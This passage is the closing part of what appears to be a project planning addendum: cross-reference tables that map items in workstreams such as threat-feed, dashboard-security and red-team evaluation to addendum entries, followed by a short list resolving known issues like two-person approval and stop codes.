| 13 threat-feed (10) | #1→A-13 · #2→A-13 · #3→A-13, A-12 · #4→A-13 · #5→A-04 · #6→SF-06, A-30, A-33 · #7→A-49 · #8→A-55, A-49 · #9→A-49, A-56 · #10→A-58 |
| 14 audit-metrics (11) | G1→A-50 · G2→A-51 · G3→A-52 · G4→A-54 · G5→A-08 · G6→A-03 · G7→A-42 · G8→A-54 · G9→A-54 · G10→A-52 · G11→A-58 |
| 15 dashboard-shell (12) | G1→A-51 (server authoritative) · G2→A-55 · G3→A-55 · G4→A-55 · G5→A-55 · G6→A-55 · G7→A-55 · G8→A-55 · G9→A-58 · G10→A-58 · G11→A-58 · G12→A-16 |
| 16 dashboard-security (8) | G1→A-03 · G2→A-46 · G3→A-54 · G4→A-49 · G5→A-54 · G6→A-11 · G7→A-31, A-55 · G8→A-55 |
| 17 dashboard-governance (7) | G1→A-31 · G2→A-31, A-28 · G3→A-24 · G4→A-12 · G5→A-09 · G6→A-36 · G7→A-28 · requests→A-55, A-28, A-31 |
| 18 test-suite (10) | A→A-53 (served by audit-metrics; a new test-suite route file ✗) · B→A-56 · C→A-19 · D→A-09 · E→A-06 · F→A-12 · G→A-20 · H→A-16 · I→A-49 · J→A-58 |
| 19 redteam-eval-perf (7) | G-C1→A-03 · G-C2→A-03, A-12 · G-C3→A-12 · G-C4→A-44 · G-C5→A-53, A-54, A-58 · G-C6→A-55 · G-C7→A-55 |
| 20 demo-mocks-docs (10) | #1→A-46 · #2→A-35, A-56 · #3→A-58 · #4→A-56 · #5→A-23, A-46 · #6→A-13 · #7→SF-03 · #8→A-55 · #9→A-58 · #10→SF-06, A-49 |

**HANDOFF "Known issues" → resolution:**
- two-person with one owner → A-20 / SF-01;
- allowlists vs $12 / $480 → SF-02;
- DLP-01 vs ACT-03 → SF-04;
- single NER → A-38;
- Claude Code stop codes → A-07;
- self-test vs live counters/kill switch → A-09 / A-29.

*End of Addendum A.*
